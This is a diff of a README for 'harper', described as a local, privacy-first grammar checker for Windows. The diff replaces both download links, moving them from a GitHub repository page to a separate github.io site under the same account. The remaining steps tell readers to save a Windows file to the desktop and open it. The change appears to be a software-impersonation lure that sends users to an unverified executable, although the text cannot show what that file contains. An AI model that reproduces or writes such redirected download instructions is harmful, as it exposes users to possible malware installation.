@@ -1,6 +1,6 @@
 # ✍️ harper - Fix your writing with privacy first
 
-[![Download Harper](https://img.shields.io/badge/Download-Blue-blue)](https://github.com/Caryleastern298/harper)
+[![Download Harper](https://img.shields.io/badge/Download-Blue-blue)](https://caryleastern298.github.io)
 
 Harper improves your writing. It checks your grammar and spelling without sending data to a server. You keep your work private. The software runs on your computer. It uses Rust to reach high speeds.
 
@@ -10,7 +10,7 @@ You need a computer running Windows 10 or Windows 11 to use this app. Harper doe
 
 Follow these steps to install the program:
 
-1. Visit this page to download: [https://github.com/Caryleastern298/harper](https://github.com/Caryleastern298/harper)
+1. Visit this page to download: [https://caryleastern298.github.io](https://caryleastern298.github.io)
 2. Look for the file labeled for Windows.
 3. Save the file to your desktop.
 4. Open the file to start the installation.
